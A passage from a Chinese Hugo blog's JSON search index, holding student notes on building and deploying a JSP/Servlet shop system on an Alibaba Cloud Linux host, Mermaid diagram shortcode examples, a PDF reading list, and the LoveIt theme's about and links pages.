兼容HTML，在JSP中可以向在HTML文件中一样写HTML/CSS和JS ","date":"2021-04-06","objectID":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/:4:0","tags":[],"title":"商城系统笔记","uri":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"categories":["大三上实训笔记"],"content":"四、编码— 业务(流程)实现 按照设计阶段完成业务流程，完成项目功能的实现 4.1 管理员登录功能 4.1.1 创建LoginServlet Servlet类——指的是继承了javax.servlet.HttpServlet类、实现了HTTP协议、能够接收HTTP请求的类 Servlet类的创建步骤 4.1.2 login.jsp提交数据到LoginServlet类 login.jsp 4.1.3 在LoginServlet类接收并处理请求 LoginServlet 4.1.4 在login.jsp显示提示信息 login.jsp 4.1.5 使用session解决登录认证问题 登录认证问题：如果管理员没有，我们不允许浏览器访问处理login.jsp以外的任何页面 index.jsp LoginServlet 4.1.6 在index.jsp显示当前登录管理员的姓名和头像 当管理员登录成功之后，我们将管理员的信息已经存放到了session中 index.jsp 4.2 类别管理—添加类别 4.2.1 点击添加类别跳转到type-add.jsp index.jsp 4.2.2 创建TypeAddServlet TypeAddServlet 4.2.3 type-add.jsp提交类别信息到TypeAddServlet type-add.jsp 4.2.4 在TypeAddServlet中接收并保存类信息，并跳转到提示页面 TypeAddServlet 4.2.5 在tips页面显示提示信息 因为操作成功和操作失败显示不同的信息，因此在jsp页面中需要实现流程控制—分支语句。 我们可以在JSP页面中使用JSTL实现流程控制（分支、循环） 在JSP页面中使用JSTL标签的准备工作： 下载jstl.jar 和 standard.jar并添加到项目 在需要使用JSTL标签库的JSP页面中引入标签 \u003c%@ taglib prefix=\"c\" uri=\"http://java.sun.com/jsp/jstl/core\" %\u003e tips.jsp 4.2.6 类别数据校验 type-add.jsp 4.3 类别管理—类别列表 4.3.1 创建TypeListServlet类 TypeListServlet 4.3.2 在index.jsp点击类别列表跳转到TypeListServlet index.jsp 4.3.3 在TypeListServlet中查询所有类别并传递到type-list.jsp TypeListServlet 4.3.4 在type-list.jsp中显示类别列表信息 因为TypeListServlet传递的是一个Type的集合，因此在type-list.jsp中需要通过JSTL的循环来遍历所有的类别 type-list.jsp 4.4 类别管理—修改类别 4.4.1 创建TypeQueryServlet 因为点击类别列表中的“修改”之后，需要跳转到TypeQueryServlet，因此要先完成TypeQueryServlet的创建 TypeQueryServlet 4.4.2 点击type-list.jsp页面的修改将类别ID传递到TypeQueryServlet type-list.jsp 4.4.3 在TypeQueryServlet接收类别ID、查询并传递到type-modify.jsp TypeQueryServlet 4.4.4 在type-modify.jsp显示类别的原始信息 type-modify.jsp 4.4.5 创建TypeUpdateServlet 4.4.6 在type-modify.jsp完成修改之后提交到TypeUpdateServlet type-modify.jsp 4.4.7 在TypeUpdateServlet接收类别信息并执行修改 TypeUpdateServlet 4.5 类别管理—删除类别 4.5.1 创建TypeDeleteServlet类 4.5.2 在type-list.jsp页面点击删除跳转到TypeDeleteServlet type-list.jsp 4.5.3 在TypeDeleteServlet中接收类别ID并执行删除 TypeDeleteServlet 4.5.4 当点击“删除”之后弹出弹窗确认 type-list.jsp 4.6 商品管理—发布商品 4.6.1 设计goods-add.jsp 步骤略 4.6.2 完成数据库操作 创建DTO类 Goods 创建DAO类 GoodsDAO 4.6.3 创建GoodsListTypeServlet类 4.6.4 在index.jsp页面点击发布商品跳转到 index.jsp 4.6.5. 在GoodsListTyp","date":"2021-04-06","objectID":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/:5:0","tags":[],"title":"商城系统笔记","uri":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"categories":["大三上实训笔记"],"content":"五、项目部署（Linux） 项目开发完成之后，将项目部署到生产环境正式的上线运营 5.1 Linux介绍 5.1.1 优点 用于生产环境的服务器主机通常会选择Linux系统 windows的优点是有比较人性化的可视化操作界面，这个可视化界面会占用大量的系统资源；但是生产环境中服务器主机主要用于web容器（tomcat）的执行，为了最大限度的使用硬件资源，所以我们通常会选择系统开销更小的Linux Linux系统是开源 Linux性能比windows更稳定（宕机概率较低） Linux防火墙组件性能高、保证系统安全 5.1.2 版本 RedHat（效率高、可靠性好） Ubuntu CentOS（基于RedHat源码编译而成，完全开源） 6.x 7.x 5.1.3 如何获取Linux 安装虚拟机，在虚拟机中安装CentOS 购买硬件主机、安装（成本高、商用） 购买云主机 5.2 购买云主机 5.2.1 云主机运营商 阿里云（推荐） https://developer.aliyun.com/adc/student/#ecscolleges-collocation-stu https://dashi.aliyun.com/site/cloud/student 腾讯云 5.3 管理云主机 5.3.1 登录到云主机 登录到阿里云的控制台（使用购买云主机时的账号和密码） https://account.aliyun.com/ 进入到ECS服务器管理界面 点击购买的实例进入到实例的配置页面 5.3.2 云主机系统管理 常规配置 5.3.3 修改云主机密码 设置root用户的登录密码 密码重置完成之后，重启服务器 5.3.4 安全组设置 阿里云主机为了保证系统的安全，提供了访问限制（端口配置） 进入到安全组配置页面 放行 3306端口 放行8080端口 5.4 使用远程工具连接云主机 云主机是远程的主机，需要使用工具进行远程连接，然后通过远程工具进行云主机的操作 5.4.1 xftp xftp是一个远程的文件传输工具，可以将本机上的文件上传到云主机 从群文件下载并安装（傻瓜式安装） 创建连接 将Tomcat和JDK的安装包 上传到 Linux 5.4.2 xshell xshell是一个远程终端，可以通过指令操作远程云主机 从群文件下载并安装（傻瓜式） 如果xftp已经与云主机建立连接，xshell其实是可以不用建立连接的，建议在xshell创建连接 5.5 在Linux系统中安装JDK并配置环境变量 5.5.1 将JDK的安装包上传到Linux系统的usr/local目录 使用xftp上传文件 5.5.2 解压JDK的压缩包 xshell连接到云主机 [root@theo ~]# cd /usr/local [root@theo local]# ls aegis apache-tomcat-8.5.46.tar.gz bin etc games include jdk-8u221-linux-x64.tar.gz lib lib64 libexec sbin share src [root@theo local]# tar -zxvf jdk-8u221-linux-x64.tar.gz 查看解压后的目录结构 [root@theo local]# ls aegis apache-tomcat-8.5.46.tar.gz bin etc games include jdk1.8.0_221 jdk-8u221-linux-x64.tar.gz lib lib64 libexec sbin share src [root@theo local]# cd jdk1.8.0_221/ [root@theo jdk1.8.0_221]# ls bin COPYRIGHT include javafx-src.zip jre lib LICENSE man README.html release src.zip THIRDPARTYLICENSEREADME-JAVAFX.txt THIRDPARTYLICENSEREADME.txt [root@theo jdk1.8.0_221]# cd bin [root@theo bin]# ls appletviewer jar javadoc javapackager jconsole jhat jmc jsadebugd jvisualvm pack200 rmiregistry tnameserv xjc ControlPanel jarsigner javafxpackager java-rmi.cgi jcontrol jinfo jmc.ini jstack keytool policytool sc","date":"2021-04-06","objectID":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/:6:0","tags":[],"title":"商城系统笔记","uri":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"categories":["大三上实训笔记"],"content":"六、项目开发任务（必须完成） 1.随堂项目功能需要完成 管理员登录 类别管理 添加类别（JS数据校验） 类别列表 删除类别（JS提示） 修改类别 商品管理 发布商品 商品列表+分页 2.扩展功能（自行完成） 管理员登录的表单校验 类别管理 修改类别（JS数据校验） 商品管理 发布商品（JS数据校验） 删除商品 修改商品 商品详情 ","date":"2021-04-06","objectID":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/:7:0","tags":[],"title":"商城系统笔记","uri":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"categories":["hugo"],"content":"mermaid shortcode 使用 Mermaid 库提供绘制图表和流程图的功能.","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":" mermaid shortcode 使用 Mermaid 库提供绘制图表和流程图的功能. mermaid 是一个可以帮助你在文章中绘制图表和流程图的库, 类似 Markdown 的语法. 只需将你的 mermaid 代码插入 mermaid shortcode 中即可. ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:0:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"流程图 一个 流程图 mermaid 示例: {{\u003c mermaid \u003e}} graph LR; A[Hard edge] --\u003e|Link text| B(Round edge) B --\u003e C{Decision} C --\u003e|One| D[Result one] C --\u003e|Two| E[Result two] {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:1:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"时序图 一个 时序图 mermaid 示例: {{\u003c mermaid \u003e}} sequenceDiagram participant Alice participant Bob Alice-\u003e\u003eJohn: Hello John, how are you? loop Healthcheck John-\u003eJohn: Fight against hypochondria end Note right of John: Rational thoughts \u003cbr/\u003eprevail... John--\u003eAlice: Great! John-\u003eBob: How about you? Bob--\u003eJohn: Jolly good! {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:2:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"甘特图 一个 甘特图 mermaid 示例: {{\u003c mermaid \u003e}} gantt dateFormat YYYY-MM-DD title Adding GANTT diagram to mermaid excludes weekdays 2014-01-10 section A section Completed task :done, des1, 2014-01-06,2014-01-08 Active task :active, des2, 2014-01-09, 3d Future task : des3, after des2, 5d Future task2 : des4, after des3, 5d {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:3:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"类图 一个 类图 mermaid 示例: {{\u003c mermaid \u003e}} classDiagram Animal \u003c|-- Duck Animal \u003c|-- Fish Animal \u003c|-- Zebra Animal : +int age Animal : +String gender Animal: +isMammal() Animal: +mate() class Duck{ +String beakColor +swim() +quack() } class Fish{ -int sizeInFeet -canEat() } class Zebra{ +bool is_wild +run() } {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:4:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"状态图 一个 状态图 mermaid 示例: {{\u003c mermaid \u003e}} stateDiagram-v2 [*] --\u003e Still Still --\u003e [*] Still --\u003e Moving Moving --\u003e Still Moving --\u003e Crash Crash --\u003e [*] {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:5:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"Git 图 一个 Git 图 mermaid 示例: {{\u003c mermaid \u003e}} gitGraph commit commit branch develop checkout develop commit commit checkout main merge develop commit commit {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:6:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"实体关系图 一个 实体关系图 mermaid 示例: {{\u003c mermaid \u003e}} erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:7:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"用户体验旅程图 一个 用户体验旅程图 mermaid 示例: {{\u003c mermaid \u003e}} journey title My working day section Go to work Make tea: 5: Me Go upstairs: 3: Me Do work: 1: Me, Cat section Go home Go downstairs: 5: Me Sit down: 5: Me {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:8:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"饼图 一个 饼图 mermaid 示例: {{\u003c mermaid \u003e}} pie \"Dogs\" : 386 \"Cats\" : 85 \"Rats\" : 15 {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:9:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":["hugo"],"content":"依赖图 一个 依赖图 mermaid 示例: {{\u003c mermaid \u003e}} requirementDiagram requirement test_req { id: 1 text: the test text. risk: high verifymethod: test } element test_entity { type: simulation } test_entity - satisfies -\u003e test_req {{\u003c /mermaid \u003e}} 呈现的输出效果如下: ","date":"2020-03-03","objectID":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/:10:0","tags":[],"title":"使用 Mermaid 库提供绘制图表和流程图的功能","uri":"/posts/%E4%BD%BF%E7%94%A8-mermaid-%E5%BA%93%E6%8F%90%E4%BE%9B%E7%BB%98%E5%88%B6%E5%9B%BE%E8%A1%A8%E5%92%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%9A%84%E5%8A%9F%E8%83%BD/"},{"categories":null,"content":"PDF文章列表 pdf名称 备注 1、JavaSE：Java入门.pdf 2、JavaSE：基础语法.pdf 3、JavaSE：流程控制.pdf 4、JavaSE：方法.pdf 5、JavaSE：数组.pdf 6、JavaSE：面向对象.pdf 7、JavaSE：异常机制.pdf 8、JavaSE：常用类.pdf 9、JavaSE：集合框架.pdf 10、JavaSE：IO流.pdf 11、JavaSE：多线程.pdf 12、JavaSE：网络编程.pdf 13、JavaSE：Gui编程.pdf 14、JavaSE：注解和反射.pdf 15、MySQL和JDBC.pdf 16、前端：Html5.pdf 18、前端：JavaScript、jQuery.pdf 19、JavaWeb.pdf 20、MyBatis.pdf 21、Spring.pdf 22、SpringMVC.pdf 23、大前端串讲.pdf 24、Vue精讲.pdf 25、SpringBoot入门及原理.pdf 26、SpringBoot操作数据库.pdf 27、SpringBoot开发单体应用.pdf 28、SpringBootWeb开发提升.pdf 29、SpringSecurity权限控制.pdf 31、Shiro.pdf 32、SpringCloudNetflix-H版.pdf 33、JVM探究.pdf 34、JUC精讲.pdf 35、Git.pdf 36、Linux使用.pdf 37、Redis精讲.pdf 38、ElasticSearch.pdf 40、Docker.pdf docker 基础 41、Docker下.pdf compose、swarm java数据结构与算法.pdf Exin DevOps Master WhitePaper_V1.5_CN.pdf DevOps Master 白皮书企业DevOps的成功之路 Devops之基于Jenkins的CI与CD.pdf Devops之基于Jenkins的CI与CD Jenkins与Gitlab.pdf Jenkins持续集成从入门到精通.pdf 2021阿里巴巴Java面试手册 剑指OFFER名企面试官精讲典型编程题_第2版 剑指OFFER 机器学习 机器学习 python 学习笔记 python 学习笔记 阿里系Java开发相关 名称 备注 轻松玩转docker.pdf Nacos架构原理.pdf Elasticsearch全观测技术解析与应用.pdf 技术人的百宝黑皮书.pdf 阿里低代码引擎白皮书.pdf java开发手册嵩山版.pdf java开发手册泰山版.pdf ","date":"2019-08-02","objectID":"/pdflist/:0:0","tags":null,"title":"pdf列表","uri":"/pdflist/"},{"categories":null,"content":"  LoveIt 是一个由  Dillon 开发的简洁、优雅且高效的 Hugo 博客主题。 它的原型基于 LeaveIt 主题 和 KeepIt 主题。 Hugo 主题 LoveIt ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"关于本站","uri":"/about/"},{"categories":null,"content":"特性 ","date":"2019-08-02","objectID":"/about/:1:0","tags":null,"title":"关于本站","uri":"/about/"},{"categories":null,"content":"性能和 SEO  性能优化：在 Google PageSpeed Insights 中， 99/100 的移动设备得分和 100/100 的桌面设备得分  使用基于 JSON-LD 格式 的 SEO SCHEMA 文件进行 SEO 优化  支持 Google Analytics  支持 Fathom Analytics  支持 Plausible Analytics  支持 Yandex Metrica  支持搜索引擎的网站验证 (Google, Bind, Yandex 和 Baidu)  支持所有第三方库的 CDN  基于 lazysizes 自动转换图片为懒加载 ","date":"2019-08-02","objectID":"/about/:1:1","tags":null,"title":"关于本站","uri":"/about/"},{"categories":null,"content":"外观和布局  桌面端/移动端 响应式布局  浅色/深色 主题模式  全局一致的设计语言  支持分页  易用和自动展开的文章目录  支持多语言和国际化  美观的 CSS 动画 社交和评论系统  支持 Gravatar 头像  支持本地头像  支持多达 76 种社交链接  支持多达 24 种网站分享  支持 Disqus 评论系统  支持 Gitalk 评论系统  支持 Valine 评论系统  支持 Facebook comments 评论系统  支持 Telegram comments 评论系统  支持 Commento 评论系统  支持 utterances 评论系统  支持 giscus 评论系统 ","date":"2019-08-02","objectID":"/about/:1:2","tags":null,"title":"关于本站","uri":"/about/"},{"categories":null,"content":"扩展功能  支持基于 Lunr.js 或 algolia 的搜索  支持 Twemoji  支持代码高亮  一键复制代码到剪贴板  支持基于 lightGallery 的图片画廊  支持 Font Awesome 图标的扩展 Markdown 语法  支持上标注释的扩展 Markdown 语法  支持分数的扩展 Markdown 语法  支持基于 $\\KaTeX$ 的数学公式  支持基于 mermaid 的图表 shortcode  支持基于 ECharts 的交互式数据可视化 shortcode  支持基于 Mapbox GL JS 的 Mapbox shortcode  支持基于 APlayer 和 MetingJS 的音乐播放器 shortcode  支持 Bilibili 视频 shortcode  支持多种注释的 shortcode  支持自定义样式的 shortcode  支持自定义脚本的 shortcode  支持基于 TypeIt 的打字动画 shortcode  支持基于 cookieconsent 的 Cookie 许可横幅  支持人物标签的 shortcode … ","date":"2019-08-02","objectID":"/about/:1:3","tags":null,"title":"关于本站","uri":"/about/"},{"categories":null,"content":"许可协议 LoveIt 根据 MIT 许可协议授权。 更多信息请查看 LICENSE 文件。 ","date":"2019-08-02","objectID":"/about/:2:0","tags":null,"title":"关于本站","uri":"/about/"},{"categories":null,"content":"特别感谢 LoveIt 主题中用到了以下项目，感谢它们的作者： normalize.css Font Awesome Simple Icons Animate.css autocomplete Lunr.js algoliasearch lazysizes object-fit-images Twemoji emoji-data lightGallery clipboard.js Sharer.js TypeIt $\\KaTeX$ mermaid ECharts Mapbox GL JS APlayer MetingJS Gitalk Valine cookieconsent ","date":"2019-08-02","objectID":"/about/:3:0","tags":null,"title":"关于本站","uri":"/about/"},{"categories":null,"content":" 语雀 在线资源入口 nuxt静态页面 nuxt框架，企业产品展示 KKKPJSKEY's-Case-Archives KKKPJSKEY的博客 稀土掘金 一个帮助开发者成长的社区 开源中国 开源中国 Elementui 网站快速成型工具 React 构建用户界面的JavaScript库 Vue 构建用户界面的渐进式框架 RuoYi 构建web应用程序 Docker 开源容器引擎 廖雪峰的官方网站 廖雪峰的官方网站 processon processon stackoverflow Stack Overflow is a community of 21.9 million programmers, just like you, helping each other. javaguide 「Java学习 + 面试指南」涵盖 Java 程序员需要掌握的核心知识 美团技术团队 涵盖了前端（Web、iOS和Android）、后台、系统、算法、测试、运维、大数据等技术领域 文件管理工具 文件管理工具 IT类电子书 IT类电子书 数据转换工具 数据转换工具 ","date":"2019-08-02","objectID":"/friend/:0:0","tags":null,"title":"友情链接","uri":"/friend/"}]